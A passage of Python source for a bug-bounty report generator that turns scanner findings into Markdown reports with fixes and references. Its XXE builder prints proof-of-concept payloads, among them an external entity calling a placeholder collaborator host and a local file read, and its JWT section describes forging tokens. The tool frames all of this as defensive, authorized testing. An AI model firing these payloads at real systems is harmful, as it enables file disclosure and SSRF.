        **Confirmation:** send the forged token — if the endpoint returns a 200 with your
        test account's data, the vulnerability is confirmed.
        Test ONLY on your own test account.
    """)
    impact = (
        "Authentication bypass: an attacker can forge a JWT for any user (including admin accounts) "
        "without knowing the signing secret. "
        "Depending on the token claims, this enables full account takeover, privilege escalation, "
        "and cross-tenant data access."
    )
    fix_primary = (
        "Explicitly specify the expected algorithm when verifying JWTs — never accept `alg:none`. "
        "Example: `jwt.decode(token, key, algorithms=['RS256'])`. "
        "Maintain a separate signing key for each algorithm type. "
        "For HS256: use a secret of at least 256 bits of entropy (not a password)."
    )
    fix_secondary = (
        "Rotate signing keys on a schedule and on any key exposure. "
        "Use short JWT expiry times (15 min for access tokens) combined with refresh token rotation. "
        "Log and alert on algorithm-mismatch verification failures."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_xxe(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"An XML External Entity vulnerability at `{asset}` allows attacker-controlled "
        f"XML input to define external entities, enabling server-side file read or "
        f"SSRF via the XML parser."
    )
    steps = [
        f"Locate the XML-parsing code at `{asset}` (scanner: {finding.scanner}).",
        "Craft an XML document with an external entity pointing to your OOB callback:",
        "    `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://your-collab.domain/xxe'>]>`",
        "Send the payload to the endpoint and observe: (a) OOB HTTP callback, or (b) file content in response.",
        "For blind XXE: use an out-of-band channel (DNS callback) to confirm entity resolution.",
        "Expected: XML parser configured with entity expansion disabled. "
        "Actual: external entity is resolved and fetched.",
        "Note: do NOT read sensitive files like `/etc/passwd` — use `/etc/hostname` or the OOB probe only.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **XXE OOB probe payload:**
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "http://your-collab.domain/xxe-probe">
        ]>
        <root>&xxe;</root>
        ```

        **Benign file read (confirmation only):**
        ```xml
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
        <root>&xxe;</root>
        ```

        **Scanner evidence:**
        ```
        {evidence_safe}
        ```

        Confirmation: OOB callback received from target server, OR `/etc/hostname` content
        appears in the response.
        Do NOT read `/etc/passwd`, SSH keys, or application secrets.
    """)
    impact = (
        "XXE enables: (1) server-side file disclosure (application config, SSH keys); "
        "(2) SSRF via XML entity fetching internal URLs; "
        "(3) denial of service via recursive entity expansion (billion laughs attack). "
        "Critical when combined with cloud metadata endpoint reachability."
    )
    fix_primary = (
        "Disable external entity processing in the XML parser. "
        "Python: `lxml.etree.XMLParser(resolve_entities=False, no_network=True)`. "
        "Java: `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`. "
        "Never use `expat` or similar parsers with default settings on untrusted XML."
    )
    fix_secondary = (
        "Prefer JSON over XML for API inputs where possible. "
        "Apply schema validation to reject unexpected document structures before parsing. "
        "Deploy network-level egress controls to block the parser from making outbound connections."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_generic(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    evidence_safe = _mask_evidence_secrets(finding.evidence[:400])
    summary = (
        f"Scanner `{finding.scanner}` flagged rule `{finding.rule_id}` at `{asset}`. "
        f"A potential security issue was detected that requires manual verification to "
        f"confirm exploitability and assess impact."
    )
    steps = [
        f"Locate the reported code at `{asset}` (scanner: {finding.scanner}, rule: {finding.rule_id}).",
        "Read the scanner evidence and identify the vulnerable pattern or anti-pattern.",
        "Trace the data flow from the nearest user-controlled input to the flagged code location.",
        "Determine whether the vulnerable code path is reachable without authentication.",
        "Construct a minimal test case that exercises the code path with boundary/adversarial input.",
        "Observe whether the security control (validation, encoding, parameterization, authorization) "
        "is absent or bypassable.",
        "Expected: appropriate control present at the flagged location. "
        f"Actual: {evidence_safe[:100]}",
        "Document: full request/response or code execution trace + the minimal triggering input.",
    ]
    poc = textwrap.dedent(f"""\
        **Finding:** `{finding.rule_id}` at `{asset}`
        **Scanner:** {finding.scanner}

        **Evidence (scanner output):**
        ```
        {evidence_safe}
        ```

        **Manual verification steps:**
        1. Review the code at `{asset}` and confirm the flagged pattern.
        2. Trace input flow from the nearest API/HTTP entry point.
        3. Provide a minimal triggering request demonstrating the issue.
        4. Attach request/response or code output as supporting evidence.
    """)
    impact = (
        f"Impact is conditional on the vulnerability class and exploitability. "
        f"Review the scanner evidence at `{asset}` and the CWE reference "
        f"({finding.cwe or 'unknown'}) for the specific attack scenario."
    )
    fix_primary = (
        f"Address the pattern flagged by `{finding.rule_id}`. "
        f"Apply the control specified in the CWE remediation guide "
        f"({finding.cwe or 'see references'}) at the point of user input handling."
    )
    fix_secondary = (
        "Add a regression test that exercises the fixed code path with adversarial input. "
        "Add the rule to your CI SAST configuration to prevent reintroduction."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


# Dispatch table
_VULN_CLASS_BUILDERS: dict[VulnClass, object] = {
    VulnClass.SQLI:             _build_sqli,
    VulnClass.CMD_INJECTION:    _build_cmd_injection,
    VulnClass.HARDCODED_SECRET: _build_hardcoded_secret,
    VulnClass.SCA_CVE:          _build_sca_cve,
    VulnClass.SSRF:             _build_ssrf,
    VulnClass.PATH_TRAVERSAL:   _build_path_traversal,
    VulnClass.XSS:              _build_xss,
    VulnClass.DESERIALIZATION:  _build_deserialization,
    VulnClass.JWT:              _build_jwt,
    VulnClass.XXE:              _build_xxe,
    VulnClass.GENERIC:          _build_generic,
}


# ── References builder ─────────────────────────────────────────────────────────

_VULN_CLASS_REFERENCES: dict[VulnClass, list[str]] = {
    VulnClass.SQLI: [
        "https://cwe.mitre.org/data/definitions/89.html",
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        "https://portswigger.net/web-security/sql-injection",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.CMD_INJECTION: [
        "https://cwe.mitre.org/data/definitions/78.html",
        "https://owasp.org/www-community/attacks/Command_Injection",
        "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
        "https://portswigger.net/web-security/os-command-injection",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.HARDCODED_SECRET: [
        "https://cwe.mitre.org/data/definitions/798.html",
        "https://cwe.mitre.org/data/definitions/259.html",
        "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html",
        "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure",
        "https://trufflesecurity.com/blog/trufflehog-detectors",
    ],
    VulnClass.SCA_CVE: [
        "https://osv.dev/",
        "https://nvd.nist.gov/",
        "https://github.com/advisories",
        "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
        "https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html",
    ],
    VulnClass.SSRF: [
        "https://cwe.mitre.org/data/definitions/918.html",
        "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
        "https://portswigger.net/web-security/ssrf",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.PATH_TRAVERSAL: [
        "https://cwe.mitre.org/data/definitions/22.html",
        "https://owasp.org/www-community/attacks/Path_Traversal",
        "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
        "https://portswigger.net/web-security/file-path-traversal",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.XSS: [
        "https://cwe.mitre.org/data/definitions/79.html",
        "https://owasp.org/www-community/attacks/xss/",
        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        "https://portswigger.net/web-security/cross-site-scripting",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.DESERIALIZATION: [
        "https://cwe.mitre.org/data/definitions/502.html",
        "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
        "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
        "https://portswigger.net/web-security/deserialization",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.JWT: [
        "https://cwe.mitre.org/data/definitions/347.html",
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
        "https://portswigger.net/web-security/jwt",
        "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.XXE: [
        "https://cwe.mitre.org/data/definitions/611.html",
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
        "https://portswigger.net/web-security/xxe",
        "https://www.first.org/cvss/calculator/4.0",
    ],
    VulnClass.GENERIC: [
        "https://owasp.org/www-project-top-ten/",
        "https://cwe.mitre.org/top25/",
        "https://www.first.org/cvss/calculator/4.0",
    ],
}


def _build_references(finding: Finding, vuln_class: VulnClass) -> list[str]:
    refs = list(_VULN_CLASS_REFERENCES.get(vuln_class, _VULN_CLASS_REFERENCES[VulnClass.GENERIC]))
    if finding.cwe:
        n = re.sub(r"[^0-9]", "", finding.cwe)
        cwe_url = f"https://cwe.mitre.org/data/definitions/{n}.html"
        if cwe_url not in refs:
            refs.insert(0, cwe_url)
    # Look for CVE/GHSA in evidence and add to refs
    for m in re.finditer(r"(CVE-\d{4}-\d+|GHSA-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})", finding.evidence, re.IGNORECASE):
        advisory_id = m.group(1).upper()
        if advisory_id.startswith("GHSA-"):
            url = f"https://github.com/advisories/{advisory_id}"
        else:
            url = f"https://nvd.nist.gov/vuln/detail/{advisory_id}"
        if url not in refs:
            refs.append(url)
    return refs


# ── Severity justification builder ────────────────────────────────────────────


_SEV_JUSTIFICATIONS: dict[VulnClass, str] = {
    VulnClass.SQLI:
        "AV:N (network-accessible), AC:L (no special conditions), PR:N (unauthenticated), "
        "VC:H/VI:H (database read/write). Critical or High depending on auth requirement.",
    VulnClass.CMD_INJECTION:
        "AV:N, AC:L, PR:N, UI:N, VC:H/VI:H/VA:H — network-accessible OS command execution "
        "with no interaction required.",
    VulnClass.HARDCODED_SECRET:
        "AV:N, AC:L, PR:N — the credential is accessible to anyone with repo read access. "
        "VC:H/VI:H because the associated service is fully compromised once the key is used.",
    VulnClass.SCA_CVE:
        "Severity inherits from the CVE CVSS rating. Attack complexity and authentication "
        "requirements depend on the specific vulnerability; see the advisory.",
    VulnClass.SSRF:
        "AV:N, AC:L, PR:N, VC:H — server reaches internal services. "
        "Critical if IMDSv1 metadata endpoint is reachable (credential theft).",
    VulnClass.PATH_TRAVERSAL:
        "AV:N, AC:L, PR:N, VC:H — arbitrary file read without authentication. "
        "Elevated to Critical if write-enabled paths exist.",
    VulnClass.XSS:
        "AV:N, AC:L, UI:P (victim must load the page), VC:H/VI:L. "
        "High for stored XSS (admin context → ATO). Medium for reflected.",
    VulnClass.DESERIALIZATION:
        "AV:N, AC:L, PR:N, VC:H/VI:H/VA:H/SC:H/SI:H/SA:H — arbitrary code execution. "
        "Critical by default unless sandboxed.",
    VulnClass.JWT:
        "AV:N, AC:L, PR:N, VC:H/VI:H — token forgery enables full auth bypass. "
        "Critical if admin tokens are forgeable.",
    VulnClass.XXE:
        "AV:N, AC:L, PR:N, VC:H — file read and SSRF via entity resolution. "
        "Critical when combined with cloud metadata reachability.",
    VulnClass.GENERIC:
        "See CVSS vector and scanner evidence for specific metric justification.",
}


def _severity_justification(finding: Finding, vuln_class: VulnClass) -> str:
    base = _SEV_JUSTIFICATIONS.get(vuln_class, _SEV_JUSTIFICATIONS[VulnClass.GENERIC])
    if finding.cvss_vector:
        return f"{base} Computed vector: `{finding.cvss_vector}`."
    return base


# ── Platform hint ──────────────────────────────────────────────────────────────


def _platform_hint(finding: Finding, vuln_class: VulnClass) -> str:
    if vuln_class == VulnClass.SCA_CVE:
        return "huntr.dev (open-source CVE platform) or the project's GitHub Security Advisories"
    if finding.scanner in _SECRET_SCANNERS:
        return "HackerOne / Bugcrowd — check the program's asset list for the affected repo"
    return "HackerOne / Bugcrowd / Intigriti — submit to the program channel for the affected asset"


# ── Title builder ──────────────────────────────────────────────────────────────

_IMPACT_TITLES: dict[VulnClass, str] = {
    VulnClass.SQLI:             "database content disclosure or authentication bypass",
    VulnClass.CMD_INJECTION:    "arbitrary OS command execution",
    VulnClass.HARDCODED_SECRET: "service credential exposure",
    VulnClass.SCA_CVE:          "supply-chain vulnerability exploitation",
    VulnClass.SSRF:             "internal network access or cloud credential theft",
    VulnClass.PATH_TRAVERSAL:   "arbitrary file read",
    VulnClass.XSS:              "session hijacking or credential theft",
    VulnClass.DESERIALIZATION:  "arbitrary code execution via gadget chain",
    VulnClass.JWT:              "authentication bypass via token forgery",
    VulnClass.XXE:              "server-side file read or SSRF",
    VulnClass.GENERIC:          "security impact (see evidence)",
}


def _build_title(finding: Finding, vuln_class: VulnClass, asset: str) -> str:
    vuln_type = vuln_class.value
    impact = _IMPACT_TITLES.get(vuln_class, "security impact")
    # Keep asset short — trim to 50 chars
    asset_short = asset if len(asset) <= 50 else "..." + asset[-47:]
    return f"{vuln_type} in `{asset_short}` leading to {impact}"


# ── Public API ─────────────────────────────────────────────────────────────────


def build_bug_report(finding: Finding, run: AuditRun) -> BugReport:
    """Build a submission-ready BugReport from a Finding + AuditRun.

    Purely deterministic — no LLM calls.  Always succeeds.
    """
    vuln_class = _classify_finding(finding)
    asset = _build_affected_asset(finding)
    cvss_vector, cvss_score = _resolve_cvss(finding)
    slug = _make_slug(vuln_class, finding.id)

    builder = _VULN_CLASS_BUILDERS.get(vuln_class, _build_generic)
    summary, repro_steps, poc, impact, fix_primary, fix_secondary = builder(finding, asset)  # type: ignore[operator]

    references = _build_references(finding, vuln_class)

    return BugReport(
        finding_id=finding.id,
        slug=slug,
        audit_id=run.audit_id,
        target_uri=run.scope_policy.target.uri,
        title=_build_title(finding, vuln_class, asset),
        vuln_class=vuln_class,
        severity=finding.severity.value.capitalize(),
        cvss_vector=cvss_vector,
        cvss_score=cvss_score,
        severity_justification=_severity_justification(finding, vuln_class),
        cwe=finding.cwe,
        owasp=finding.owasp_category.value if finding.owasp_category else None,
        affected_asset=asset,
        summary=summary,
        reproduction_steps=repro_steps,
        proof_of_concept=poc,
        impact=impact,
        remediation_primary=fix_primary,
        remediation_secondary=fix_secondary,
        references=references,
        platform_hint=_platform_hint(finding, vuln_class),
        llm_enriched=False,
    )


def render_markdown(report: BugReport) -> str:
    """Render a BugReport as clean Markdown matching the submission template.

    Output is ready to paste into huntr / HackerOne / Bugcrowd.
    """
    lines: list[str] = []

    # Title
    lines += [
        f"# {report.title}",
        "",
        "---",
        "",
        "## TL;DR / Summary",
        "",
        report.summary,
        "",
        "---",
        "",
        "## Severity",
        "",
    ]
    if report.cvss_vector:
        lines.append(f"- **CVSS v4.0 vector:** `{report.cvss_vector}`")
    else:
        lines.append("- **CVSS v4.0 vector:** *Not computed — see severity bucket above*")

    score_str = f"{report.cvss_score:.1f}" if report.cvss_score is not None else "N/A"
    lines += [
        f"- **Rating / Score:** {report.severity} ({score_str})",
        f"- **Why this severity:** {report.severity_justification}",
        "",
        "---",
        "",
        "## Vulnerability Details",
        "",
        f"- **Type:** {report.vuln_class.value}",
        f"- **CWE:** {report.cwe or 'Not mapped'}",
        f"- **OWASP:** {report.owasp or 'Not mapped'}",
        "",
        "---",
        "",
        "## Affected Asset",
        "",
        f"- **File / Component:** `{report.affected_asset}`",
        f"- **Target:** `{report.target_uri}`",
        f"- **Audit ID:** `{report.audit_id}`",
        "",
        "---",
        "",
        "## Description (Bug + Root Cause)",
        "",
        report.summary,
        "",
        "---",
        "",
        "## Steps to Reproduce",
        "",
        "> Deterministic, numbered, copy-pasteable. "
        "A triager with zero context must reproduce on the first try.",
        "",
    ]
    for i, step in enumerate(report.reproduction_steps, 1):
        lines.append(f"{i}. {step}")

    lines += [
        "",
        "---",
        "",
        "## Proof of Concept",
        "",
        report.proof_of_concept,
        "",
        "> Defensive / authorized testing only. "
        "PoC is designed to confirm the vulnerability for the asset owner's triager. "
        "All secret values are masked. No weaponized payloads.",
        "",
        "---",
        "",
        "## Impact / Business Impact",
        "",
        report.impact,
        "",
        "---",
        "",
        "## Remediation / Recommended Fix",
        "",
        f"**Primary fix:** {report.remediation_primary}",
        "",
        f"**Defense-in-depth:** {report.remediation_secondary}",
        "",
        "---",
        "",
        "## References",
        "",
    ]
    for ref in report.references:
        lines.append(f"- {ref}")

    lines += [
        "",
        "---",
        "",
        f"*Generated by AuditAgent (Jarvis). Defensive-only. Authorized targets only.*  ",
        f"*Platform hint: {report.platform_hint}*  ",
        f"*Generated: {report.generated_at.strftime('%Y-%m-%d %H:%M UTC')}*  ",
        f"*LLM-enriched: {report.llm_enriched}*",
    ]

    return "\n".join(lines)


# ── Optional LLM enrichment ────────────────────────────────────────────────────

_ENRICH_PROMPT = """\
You are a professional bug-bounty report editor. Improve the following bug report excerpt.
Do NOT change the factual content, severity, CVSS, or PoC payloads.
Only improve: (1) clarity and precision of the Summary, (2) specificity of the Impact,
(3) actionability of the Remediation.

Return ONLY a JSON object with keys: "summary", "impact", "remediation_primary".
All values must be plain strings (no markdown). Limit each to 4 sentences max.

CURRENT REPORT EXCERPT:
Summary: {summary}
Impact: {impact}
Remediation: {remediation_primary}
Vuln class: {vuln_class}
Affected asset: {asset}
"""


async def _enrich_bug_report(report: BugReport, finding: Finding) -> BugReport:
    """Optionally improve summary/impact/remediation prose via LLM.

    Degrades gracefully to the original report on any failure.
    """
    try:
        from .pipeline import _call_llm  # same pattern as verify layer

        prompt = _ENRICH_PROMPT.format(
            summary=report.summary[:500],
            impact=report.impact[:300],
            remediation_primary=report.remediation_primary[:300],
            vuln_class=report.vuln_class.value,
            asset=report.affected_asset,
        )
        text, _cost = await _call_llm(prompt, model=None, timeout=_ENRICH_TIMEOUT)
        if not text:
            return report

        import json
        import re as _re
        json_match = _re.search(r"\{[^{}]+\}", text, _re.DOTALL)
        if not json_match:
            return report

        enriched = json.loads(json_match.group(0))
        updates: dict = {}
        if enriched.get("summary") and isinstance(enriched["summary"], str):
            updates["summary"] = enriched["summary"].strip()
        if enriched.get("impact") and isinstance(enriched["impact"], str):
            updates["impact"] = enriched["impact"].strip()
        if enriched.get("remediation_primary") and isinstance(enriched["remediation_primary"], str):
            updates["remediation_primary"] = enriched["remediation_primary"].strip()

        if not updates:
            return report

        updates["llm_enriched"] = True
        return report.model_copy(update=updates)

    except Exception as exc:
        log.debug("LLM enrich failed (using deterministic output): %s", exc)
        return report


# ── write_reports ──────────────────────────────────────────────────────────────


async def write_reports(
    findings: list[Finding],
    run: AuditRun,
    out_dir: "Path | str",
    enrich: bool = False,
) -> list[Path]:
    """Emit one report-NN-<slug>.md per confirmed/actionable HIGH+CRIT finding.

    Filters to:
      - severity in {CRITICAL, HIGH}
      - verification_status != FALSE_POSITIVE

    Also writes an index.md listing all reports.
    Returns the list of written file paths (reports + index).

    Args:
        findings:  Full finding list from the AuditRun.
        run:       The AuditRun record (for audit_id, target_uri).
        out_dir:   Base output directory; reports go into {out_dir}/reports/.
        enrich:    If True, attempt LLM prose improvement (degrades gracefully).
    """
    out_path = Path(out_dir) / "reports"
    out_path.mkdir(parents=True, exist_ok=True)

    eligible = [
        f for f in findings
        if f.severity in (Severity.CRITICAL, Severity.HIGH)
        and f.verification_status != VerificationStatus.FALSE_POSITIVE
    ]

    log.info(
        "write_reports: %d eligible findings (HIGH+CRIT, non-FP) out of %d total",
        len(eligible), len(findings),
    )

    written: list[Path] = []
    index_rows: list[str] = []

    for n, finding in enumerate(eligible, 1):
        report = build_bug_report(finding, run)
        if enrich:
            report = await _enrich_bug_report(report, finding)

        md = render_markdown(report)
        filename = f"report-{n:02d}-{report.slug}.md"
        path = out_path / filename
        path.write_text(md, encoding="utf-8")
        written.append(path)

        score_str = f"{report.cvss_score:.1f}" if report.cvss_score is not None else "N/A"
        title_col = report.title[:70] + ("..." if len(report.title) > 70 else "")
        index_rows.append(
            f"| {n} | [{title_col}](./{filename}) | {report.severity} "
            f"| {score_str} | {report.vuln_class.value} "
            f"| {finding.verification_status.value} |"
        )
        log.info("Wrote bug report #%d: %s", n, path)

    # Index page
    index_lines: list[str] = [
        "# Bug Report Index",
        "",
        f"**Audit:** `{run.audit_id}`  ",
        f"**Target:** `{run.scope_policy.target.uri}`  ",
        f"**Generated:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}  ",
        f"**Reports:** {len(written)} HIGH+CRITICAL findings (false positives excluded)",
        "",
        "| # | Title | Severity | CVSS | Type | Status |",
        "|---|---|---|---|---|---|",
        *index_rows,
        "",
        "---",
        "",
        "**Submission reminder:**",
        "- Review each report before submitting.",
        "- Submission to any external platform requires explicit human authorization (Tier-3 action).",
        "- For OSS dependencies: submit to huntr.dev. For everything else: follow the program's scope/channel.",
        "- Rotate any exposed secrets immediately, regardless of program participation.",
        "",
        "*Generated by AuditAgent (Jarvis). Defensive-only. Authorized targets only.*",
    ]
    index_path = out_path / "index.md"
    index_path.write_text("\n".join(index_lines), encoding="utf-8")
    written.append(index_path)

    return written
